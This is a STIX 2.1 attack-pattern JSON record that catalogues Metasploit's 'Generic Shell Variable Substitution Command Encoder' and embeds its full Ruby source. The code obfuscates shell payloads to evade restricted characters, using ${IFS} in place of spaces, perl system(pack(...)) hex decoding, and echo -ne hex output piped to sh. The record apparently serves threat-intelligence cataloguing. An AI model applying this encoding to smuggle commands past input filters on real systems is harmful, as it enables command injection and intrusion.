{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--965a9f8d-0ed5-4237-9409-e6027323e9be",
    "created": "2024-08-14T16:33:19.230876Z",
    "modified": "2024-08-14T16:33:19.230884Z",
    "name": "Generic Shell Variable Substitution Command Encoder",
    "description": " This encoder uses standard Bourne shell variable substitution tricks to avoid commonly restricted characters. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/encoders/cmd/generic_sh.rb",
            "external_id": "generic_sh.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Encoder\n\n  # Has some issues, but overall it's pretty good\n  Rank = ManualRanking\n\n  def initialize\n    super(\n      'Name'             => 'Generic Shell Variable Substitution Command Encoder',\n      'Description'      => %q{\n        This encoder uses standard Bourne shell variable substitution\n      tricks to avoid commonly restricted characters.\n      },\n      'Author'           => 'hdm',\n      'Arch'             => ARCH_CMD,\n      'Platform'         => 'unix')\n  end\n\n\n  #\n  # Encodes the payload\n  #\n  def encode_block(state, buf)\n\n    # Skip encoding for empty badchars\n    if(state.badchars.length == 0)\n      return buf\n    end\n\n    if (state.badchars.include?(\"-\"))\n      # Then neither of the others will work.  Get rid of spaces and hope\n      # for the best.  This obviously won't work if the command already\n      # has other badchars in it, in which case we're basically screwed.\n      if (state.badchars.include?(\" \"))\n        buf.gsub!(/\\s/, '${IFS}')\n      end\n    else\n      # Without an escape character we can't escape anything, so echo\n      # won't work.  Try perl.\n      if (state.badchars.include?(\"\\\\\"))\n        buf = encode_block_perl(state,buf)\n      else\n        buf = encode_block_bash_echo(state,buf)\n      end\n    end\n\n    return buf\n  end\n\n  #\n  # Uses the perl command to hex encode the command string\n  #\n  def encode_block_perl(state, buf)\n\n    hex = buf.unpack(\"H*\")\n    cmd = 'perl -e '\n    qot = ',-:.=+!@#$%^&'\n\n    # Find a quoting character to use\n    state.badchars.unpack('C*') { |c| qot.delete(c.chr) }\n\n    # Throw an error if we ran out of quotes\n    raise EncodingError if qot.length == 0\n\n    sep = qot[0].chr\n\n    # Convert spaces to IFS...\n    if (state.badchars.include?(\" \"))\n      cmd.gsub!(/\\s/, '${IFS}')\n    end\n\n    # Can we use single quotes to enclose the command string?\n    if (state.badchars.include?(\"'\"))\n\n      if (state.badchars.match(/\\(|\\)/))\n\n        # No paranthesis...\n        raise EncodingError\n      end\n\n      cmd << \"system\\\\(pack\\\\(qq#{sep}H\\\\*#{sep},qq#{sep}#{hex}#{sep}\\\\)\\\\)\"\n\n    else\n      if (state.badchars.match(/\\(|\\)/))\n        if (state.badchars.include?(\" \"))\n          # No spaces allowed, no paranthesis, give up...\n          raise EncodingError\n        end\n\n        cmd << \"'system pack qq#{sep}H*#{sep},qq#{sep}#{hex}#{sep}'\"\n      else\n        cmd << \"'system(pack(qq#{sep}H*#{sep},qq#{sep}#{hex}#{sep}))'\"\n      end\n    end\n\n    return cmd\n  end\n\n  #\n  # Uses bash's echo -ne command to hex encode the command string\n  #\n  def encode_block_bash_echo(state, buf)\n\n    hex = ''\n\n    # Can we use single quotes to enclose the echo arguments?\n    if (state.badchars.include?(\"'\"))\n      hex = buf.unpack('C*').collect { |c| \"\\\\\\\\\\\\x%.2x\" % c }.join\n    else\n      hex = \"'\" + buf.unpack('C*').collect { |c| \"\\\\x%.2x\" % c }.join + \"'\"\n    end\n\n    # Are pipe characters restricted?\n    if (state.badchars.include?(\"|\"))\n      # How about backticks?\n      if (state.badchars.include?(\"`\"))\n        # Last ditch effort, dollar paren\n        if (state.badchars.include?(\"$\") or state.badchars.include?(\"(\"))\n          raise EncodingError\n        else\n          buf = \"$(/bin/echo -ne #{hex})\"\n        end\n      else\n        buf = \"`/bin/echo -ne #{hex}`\"\n      end\n    else\n      buf = \"/bin/echo -ne #{hex}|sh\"\n    end\n\n    # Remove spaces from the command string\n    if (state.badchars.include?(\" \"))\n      buf.gsub!(/\\s/, '${IFS}')\n    end\n\n    return buf\n  end\nend\n",
    "x_mitre_platforms": [
        "unix')"
    ]
}